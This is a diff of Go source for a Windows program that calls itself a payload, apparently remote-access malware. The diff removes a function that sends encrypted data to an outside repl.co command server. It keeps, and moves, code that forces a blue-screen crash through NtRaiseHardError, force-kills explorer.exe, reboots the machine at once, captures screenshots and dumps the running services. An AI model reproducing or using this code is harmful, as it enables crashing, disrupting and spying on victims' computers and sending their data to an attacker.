@@ -9,15 +9,12 @@ MkIII Payload Source
 package main
 
 import (
-	"bytes"
 	"fmt"
 	"github.com/vova616/screenshot"
 	"image/png"
 	"log"
-	"net/http"
 	"os"
 	"os/exec"
-	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -30,24 +27,6 @@ var (
 	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
 	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
 )
-
-func ForceShutdown() {
-	if err := exec.Command("cmd", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
-		fmt.Println("Failed to initiate shutdown:", err)
-	}
-}
-
-func DoBSoD() {
-	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
-	NtRaiseHardError.Call(0xdeadbeef, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
-}
-
-func KillDesktop() {
-	err := exec.Command("cmd", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
-	if err != nil {
-		fmt.Println("Failed to kill Desktop process:", err)
-	}
-}
 
 func DumpService() []string {
 
@@ -91,38 +70,6 @@ func DumpService() []string {
 	return T
 }
 
-func SendRequest(body string, ip string) {
-	HashKey := RandIntBytes(3)
-	HashKeyInt, _ := strconv.Atoi(HashKey)
-
-	GenerateHeaders()
-
-	hash, nonce := CryptSign(ip, HashKey)
-
-	HEADERS[HashKeyInt] = nonce
-
-	//fmt.Println(HEADERS)
-
-	var p string = "{"
-
-	for i := 0; i < 999; i++ {
-		if i == 998 {
-			p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\""
-			continue
-		}
-		p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\","
-
-	}
-	p = p + "}"
-
-	endpoint := Encrypt(body, strings.Join(strings.Split(hash, "")[0:32], ""))
-	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
-	req.Header.Set("Content-Type", "application/json")
-
-	client := &http.Client{}
-	client.Do(req)
-}
-
 func GetScreenShot() string {
 	if _, err := os.Stat(TempFileDir); os.IsNotExist(err) {
 		os.MkdirAll(TempFileDir, 0700)
@@ -143,4 +90,22 @@ func GetScreenShot() string {
 	var _ = f.Close()
 
 	return TempFileDir + "\\CAPTURE.png"
+}
+
+func DoBSoD() {
+	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
+	NtRaiseHardError.Call(0xdeadbeef, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
+}
+
+func KillDesktop() {
+	err := exec.Command("cmd", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
+	if err != nil {
+		fmt.Println("Failed to kill Desktop process:", err)
+	}
+}
+
+func ForceShutdown() {
+	if err := exec.Command("cmd", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
+		fmt.Println("Failed to initiate shutdown:", err)
+	}
 }
